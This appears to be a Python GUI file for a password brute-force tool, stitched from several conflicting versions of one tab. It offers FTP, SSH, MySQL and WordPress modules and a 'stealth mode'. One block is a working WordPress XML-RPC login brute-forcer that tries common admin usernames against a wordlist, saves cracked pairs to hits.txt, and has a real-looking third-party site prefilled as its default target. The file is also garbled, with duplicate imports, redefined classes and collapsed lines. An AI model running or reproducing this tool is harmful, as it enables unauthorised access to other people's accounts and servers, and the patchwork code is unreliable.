ui/tabs_brute.py
import customtkinter as ctk
from tkinter import filedialog
from core.brute_force import run_brute_force, available_modules
from utils.toast import show_toast  # if you have a toast module
import threading
import customtkinter as ctk
from tkinter import filedialog
from core.brute_force import run_brute_force
from utils.toast import show_toast
import threading

class BruteTab(ctk.CTkFrame):
    def __init__(self, parent):
        super().__init__(parent)

        # Target input
        self.target_label = ctk.CTkLabel(self, text="Target IP/Host:")
        self.target_label.pack(pady=(10, 0))
        self.target_entry = ctk.CTkEntry(self)
        self.target_entry.pack()

        # Module selector with auto port + wordlist
        self.module_label = ctk.CTkLabel(self, text="Module:")
        self.module_label.pack(pady=(10, 0))
        self.module_var = ctk.StringVar()
        self.module_dropdown = ctk.CTkOptionMenu(self, variable=self.module_var,
                                                 values=["FTP", "SSH", "MySQL", "WordPress"],
                                                 command=self.auto_fill_port)
        self.module_dropdown.pack()

        # Port field
        self.port_label = ctk.CTkLabel(self, text="Port:")
        self.port_label.pack()
        self.port_entry = ctk.CTkEntry(self)
        self.port_entry.pack()

        # Wordlist field
        self.wordlist_label = ctk.CTkLabel(self, text="Wordlist File:")
        self.wordlist_label.pack()
        self.wordlist_path = ctk.StringVar()
        self.wordlist_entry = ctk.CTkEntry(self, textvariable=self.wordlist_path, width=300)
        self.wordlist_entry.pack()
        self.browse_button = ctk.CTkButton(self, text="Browse", command=self.browse_wordlist)
        self.browse_button.pack()

        # Stealth mode
        self.stealth_var = ctk.BooleanVar()
        self.stealth_check = ctk.CTkCheckBox(self, text="Stealth Mode", variable=self.stealth_var)
        self.stealth_check.pack(pady=5)

        # Progress bar (initially hidden)
        self.progress = ctk.CTkProgressBar(self, mode="indeterminate", height=10)
        self.progress.set(0)
        self.progress.pack(pady=5)
        self.progress.pack_forget()

        # Run button
        self.run_button = ctk.CTkButton(self, text="Run Brute Force", command=self.run_brute)
        self.run_button.pack(pady=10)

        # Output box
        self.output_box = ctk.CTkTextbox(self, height=250, wrap="none")
        self.output_box.pack(fill="both", expand=True, padx=10, pady=10)

    def browse_wordlist(self):
        path = filedialog.askopenfilename(initialdir="wordlists/", title="Select Wordlist")
        if path:
            self.wordlist_path.set(path)

    def auto_fill_port(self, module_name):
        default_ports = {
            "FTP": 21,
            "SSH": 22,
            "MySQL": 3306,
            "WordPress": 80
        }
        default_wordlists = {
            "FTP": "ftp_default_creds.txt",
            "SSH": "ssh_common.txt",
            "MySQL": "mysql_login.txt",
            "WordPress": "wp_login.txt"
        }

        self.port_entry.delete(0, "end")
        self.port_entry.insert(0, str(default_ports.get(module_name, "")))
        self.wordlist_path.set(f"wordlists/{default_wordlists.get(module_name, '')}")

    def run_brute(self):
        module = self.module_var.get()
        target = self.target_entry.get().strip()
        port = self.port_entry.get().strip()
        port = int(port) if port else None
        wordlist = self.wordlist_path.get() or None
        stealth = self.stealth_var.get()

        self.output_box.delete("1.0", "end")
        self.output_log(f"[*] Running brute-force on {target} with {module}...")

        self.progress.pack()
        self.progress.start()
        self.run_button.configure(state="disabled", text="Running...")

        def logger(msg):
            self.output_log(msg)

        def task():
            result = run_brute_force(module_name=module, target=target, port=port,
                                     wordlist_file=wordlist, stealth_mode=stealth, logger=logger)
            self.output_log(f"\n[=] Brute-force Result:\n{result}")
            self.run_button.configure(state="normal", text="Run Brute Force")
            self.progress.stop()
            self.progress.pack_forget()
            show_toast("Success!" if result["status"] == "success" else "Failed", style=result["status"])

        threading.Thread(target=task, daemon=True).start()

    def output_log(self, message):
        self.output_box.insert("end", message + "\n")
        self.output_box.see("end")
def run_brute(self):
    module = self.module_var.get()
    target = self.target_entry.get().strip()
    port = self.port_entry.get().strip()
    port = int(port) if port else None
    wordlist = self.wordlist_path.get() or None
    stealth = self.stealth_var.get()

    self.output_box.delete("1.0", "end")
    self.output_log(f"[*] Running brute-force on {target}...")

    self.run_button.configure(state="disabled", text="Running...")

    def logger(msg):
        self.output_log(msg)

    def task():
        result = run_brute_force(
            module_name=module,
            target=target,
            port=port,
            wordlist_file=wordlist,
            stealth_mode=stealth,
            logger=logger
        )
        self.output_log(f"\n[=] Brute-force Result:\n{result}")
        self.run_button.configure(state="normal", text="Run Brute Force")
        if result["status"] == "success":
            show_toast("Brute Force Successful!", duration=4, style="success")
        else:
            show_toast("Brute Force Failed", duration=4, style="error")

    threading.Thread(target=task, daemon=True).start()
class BruteTab(ctk.CTkFrame):
    def __init__(self, master):
        super().__init__(master)
        self.configure(padx=20, pady=20)
        self.create_widgets()

    def create_widgets(self):
        self.module_label = ctk.CTkLabel(self, text="Brute-force Module:")
        self.module_label.pack(anchor="w")

        self.module_var = ctk.StringVar()
        self.module_dropdown = ctk.CTkOptionMenu(self, variable=self.module_var, values=list(available_modules.keys()))
        self.module_dropdown.pack(fill="x")

        self.target_entry = ctk.CTkEntry(self, placeholder_text="Target IP or Host")
        self.target_entry.pack(fill="x", pady=(10, 0))

        self.port_entry = ctk.CTkEntry(self, placeholder_text="Port (optional)")
        self.port_entry.pack(fill="x", pady=(5, 0))

        self.wordlist_path = ctk.StringVar()
        self.wordlist_button = ctk.CTkButton(self, text="Choose Wordlist", command=self.browse_wordlist)
        self.wordlist_button.pack(pady=(10, 0))

        self.stealth_var = ctk.BooleanVar()
        self.stealth_checkbox = ctk.CTkCheckBox(self, text="Stealth Mode", variable=self.stealth_var)
        self.stealth_checkbox.pack(anchor="w", pady=(5, 10))

        self.run_button = ctk.CTkButton(self, text="Run Brute Force", command=self.run_brute)
        self.run_button.pack(fill="x")

        self.output_box = ctk.CTkTextbox(self, height=180)
        self.output_box.pack(fill="both", pady=(10, 0), expand=True)

    def browse_wordlist(self):
        path = filedialog.askopenfilename(filetypes=[("Text files", "*.txt")])
        if path:
            self.wordlist_path.set(path)
            self.output_log(f"[+] Selected wordlist: {path}")

    def output_log(self, message):
        self.output_box.insert("end", message + "\n")
        self.output_box.see("end")

    def run_brute(self):
        module = self.module_var.get()
        target = self.target_entry.get().strip()
        port = self.port_entry.get().strip()
        port = int(port) if port else None
        wordlist = self.wordlist_path.get() or None
        stealth = self.stealth_var.get()

        self.output_box.delete("1.0", "end")

        def logger(msg):
            self.output_log(msg)

        result = run_brute_force(
            module_name=module,
            target=target,
            port=port,
            wordlist_file=wordlist,
            stealth_mode=stealth,
            logger=logger
        )

        self.output_log(f"\n[=] Brute-force Result:\n{result}")
import customtkinter as ctk import xmlrpc.client, threading from tkinter import messagebox, filedialog

def load_brute_tab(tab): def run_brute_force(): target = target_entry.get().strip() usernames = [u.strip() for u in usernames_box.get("1.0", "end").strip().splitlines()] wordlist_path = wordlist_entry.get().strip()

if not target or not usernames or not wordlist_path:
        messagebox.showerror("Error", "Please fill all fields.")
        return

    try:
        with open(wordlist_path, 'r') as f:
            passwords = [line.strip() for line in f if line.strip()]
    except Exception as e:
        messagebox.showerror("File Error", f"Cannot read password list:\n{e}")
        return

    log_box.insert("end", "[*] Starting brute force...\n")
    server = xmlrpc.client.ServerProxy(target)

    for user in usernames:
        log_box.insert("end", f"\n[*] Trying user: {user}\n")
        for password in passwords:
            try:
                resp = server.wp.getUsersBlogs(user, password)
                if resp:
                    hit = f"[+] HIT: {user}:{password}\n"
                    log_box.insert("end", hit)
                    with open("hits.txt", "a") as hit_file:
                        hit_file.write(f"{user}:{password}\n")
                    break
            except xmlrpc.client.Fault:
                pass
            except Exception as e:
                log_box.insert("end", f"[-] Error with {user}: {e}\n")
                break

    log_box.insert("end", "[*] Brute force finished.\n")

def browse_wordlist():
    path = filedialog.askopenfilename()
    if path:
        wordlist_entry.delete(0, "end")
        wordlist_entry.insert(0, path)

ctk.CTkLabel(tab, text="Target URL (https://example.com/xmlrpc.php)").pack(pady=5)
target_entry = ctk.CTkEntry(tab, width=700)
target_entry.insert(0, "https://www.zayachek.com/xmlrpc.php")
target_entry.pack()

ctk.CTkLabel(tab, text="Usernames (one per line)").pack(pady=5)
usernames_box = ctk.CTkTextbox(tab, height=100, width=700)
usernames_box.insert("0.0", "admin\neditor\nauthor")
usernames_box.pack()

ctk.CTkLabel(tab, text="Password List").pack(pady=5)
wordlist_frame = ctk.CTkFrame(tab)
wordlist_frame.pack()
wordlist_entry = ctk.CTkEntry(wordlist_frame, width=500)
wordlist_entry.pack(side="left", padx=5)
browse_btn = ctk.CTkButton(wordlist_frame, text="Browse", command=browse_wordlist)
browse_btn.pack(side="left")

start_btn = ctk.CTkButton(tab, text="Start Brute Force", fg_color="green", hover_color="darkgreen",
                          command=lambda: threading.Thread(target=run_brute_force).start())
start_btn.pack(pady=10)

global log_box
log_box = ctk.CTkTextbox(tab, height=200, width=700)
log_box.pack()

# gui/tabs/brute_tab.py

import customtkinter as ctk
import threading
from core.brute_force import run_brute_force  # Hook to brute force logic
from utils.logger import log

class BruteTab(ctk.CTkFrame):
    def __init__(self, master):
        super().__init__(master)
        self.target_var = ctk.StringVar()
        self.username_var = ctk.StringVar()
        self.password_var = ctk.StringVar()
        self.status_var = ctk.StringVar(value="Idle")
        self.build_ui()

    def build_ui(self):
        ctk.CTkLabel(self, text="Brute Force Attack", font=("Segoe UI", 18, "bold")).pack(pady=(10, 5))

        input_frame = ctk.CTkFrame(self)
        input_frame.pack(pady=10, padx=20, fill="x")

        self.target_entry = ctk.CTkEntry(input_frame, textvariable=self.target_var, placeholder_text="Target IP...")
        self.target_entry.pack(side="left", fill="x", expand=True, padx=(0, 10))

        self.username_entry = ctk.CTkEntry(input_frame, textvariable=self.username_var, placeholder_text="Username...")
        self.username_entry.pack(side="left", fill="x", expand=True, padx=(0, 10))

        self.password_entry = ctk.CTkEntry(input_frame, textvariable=self.password_var, placeholder_text="Password...")
        self.password_entry.pack(side="left", fill="x", expand=True, padx=(0, 10))

        self.run_button = ctk.CTkButton(input_frame, text="Run Brute Force", command=self.run_brute_threaded)
        self.run_button.pack(side="left")

        self.status_label = ctk.CTkLabel(self, textvariable=self.status_var, text_color="gray", font=("Segoe UI", 12))
        self.status_label.pack(pady=(0, 10))

        self.output_box = ctk.CTkTextbox(self, height=400, wrap="word")
        self.output_box.pack(padx=20, pady=10, fill="both", expand=True)
        self.output_box.insert("end", "Brute force output will appear here...\n")
        self.output_box.configure(state="disabled")

    def run_brute_threaded(self):
        target = self.target_var.get().strip()
        username = self.username_var.get().strip()
        password = self.password_var.get().strip()

        if not target or not username or not password:
            self.show_status("Fill in all fields.")
            return

        threading.Thread(target=self.run_brute_force, args=(target, username, password), daemon=True).start()

    def run_brute_force(self, target, username, password):
        self.show_status(f"Running brute force on {target}...")
        self.set_button_state(False)

        self.append_output(f"[INFO] Starting brute force attack...\n")
        try:
            results = run_brute_force(target, username, password, gui_callback=self.append_output)
            self.append_output(f"[INFO] Brute force finished.\n")
        except Exception as e:
            self.append_output(f"[ERROR] {str(e)}\n")
        finally:
            self.set_button_state(True)
            self.show_status("Idle")

    def append_output(self, text):
        self.output_box.configure(state="normal")
        self.output_box.insert("end", text)
        self.output_box.see("end")
        self.output_box.configure(state="disabled")

    def show_status(self, text):
        self.status_var.set(text)

    def set_button_state(self, state: bool):
        self.run_button.configure(state="normal" if state else "disabled")

import customtkinter as ctk
from tkinter import filedialog
from core.brute_force import run_brute_force
from utils.toast import show_toast
import threading
import os

class BruteTab(ctk.CTkFrame):
    def __init__(self, parent):
        super().__init__(parent)

        # Target input
        self.target_label = ctk.CTkLabel(self, text="Target IP/Host:")
        self.target_label.pack(pady=(10, 0))
        self.target_entry = ctk.CTkEntry(self)
        self.target_entry.pack()

        # Module selector
        self.module_label = ctk.CTkLabel(self, text="Module:")
        self.module_label.pack(pady=(10, 0))
        self.module_var = ctk.StringVar()
        self.module_dropdown = ctk.CTkOptionMenu(self, variable=self.module_var,
                                                 values=["FTP", "SSH", "MySQL", "WordPress"],
                                                 command=self.auto_fill_port)
        self.module_dropdown.pack()

        # Port field
        self.port_label = ctk.CTkLabel(self, text="Port:")
        self.port_label.pack()
        self.port_entry = ctk.CTkEntry(self)
        self.port_entry.pack()

        # Wordlist field
        self.wordlist_label = ctk.CTkLabel(self, text="Wordlist File:")
        self.wordlist_label.pack()
        self.wordlist_path = ctk.StringVar()
        self.wordlist_entry = ctk.CTkEntry(self, textvariable=self.wordlist_path, width=300)
        self.wordlist_entry.pack()
        self.browse_button = ctk.CTkButton(self, text="Browse", command=self.browse_wordlist)
        self.browse_button.pack()

        # Stealth mode
        self.stealth_var = ctk.BooleanVar()
        self.stealth_check = ctk.CTkCheckBox(self, text="Stealth Mode", variable=self.stealth_var)
        self.stealth_check.pack(pady=5)

        # Progress bar
        self.progress = ctk.CTkProgressBar(self, mode="indeterminate", height=10)
        self.progress.set(0)
        self.progress.pack(pady=5)
        self.progress.pack_forget()

        # Run button
        self.run_button = ctk.CTkButton(self, text="Run Brute Force", command=self.run_brute)
        self.run_button.pack(pady=10)

        # Output box
        self.output_box = ctk.CTkTextbox(self, height=250, wrap="none")
        self.output_box.pack(fill="both", expand=True, padx=10, pady=10)

    def browse_wordlist(self):
        path = filedialog.askopenfilename(initialdir="wordlists/", title="Select Wordlist")
        if path:
            self.wordlist_path.set(path)

    def auto_fill_port(self, module_name):
        default_ports = {
            "FTP": 21,
            "SSH": 22,
            "MySQL": 3306,
            "WordPress": 80
        }
        default_wordlists = {
            "FTP": "ftp_default_creds.txt",
            "SSH": "ssh_common.txt",
            "MySQL": "mysql_login.txt",
            "WordPress": "wp_login.txt"
        }
        self.port_entry.delete(0, "end")
        self.port_entry.insert(0, str(default_ports.get(module_name, "")))
        self.wordlist_path.set(f"wordlists/{default_wordlists.get(module_name, '')}")

    def run_brute(self):
        module = self.module_var.get()
        target = self.target_entry.get().strip()
        port = self.port_entry.get().strip()
        port = int(port) if port else None
        wordlist = self.wordlist_path.get() or None
        stealth = self.stealth_var.get()

        self.output_box.delete("1.0", "end")
        self.output_log(f"[*] Running brute-force on {target} using {module}...")

        self.progress.pack()
        self.progress.start()
        self.run_button.configure(state="disabled", text="Running...")

        def logger(msg):
            self.output_log(msg)
            self.save_log(msg)

        def task():
            result = run_brute_force(module_name=module, target=target, port=port,
                                     wordlist_file=wordlist, stealth_mode=stealth, logger=logger)
            self.output_log(f"\n[=] Brute-force Result:\n{result}")
            self.save_log(f"[=] Result: {result}")
            self.run_button.configure(state="normal", text="Run Brute Force")
            self.progress.stop()
            self.progress.pack_forget()
            show_toast("Brute-force Complete", style=result["status"])

        threading.Thread(target=task, daemon=True).start()

    def output_log(self, message):
        self.output_box.insert("end", message + "\n")
        self.output_box.see("end")

    def save_log(self, message):
        os.makedirs("logs", exist_ok=True)
        with open("logs/brute_log.txt", "a") as f:
            f.write(message + "\n")
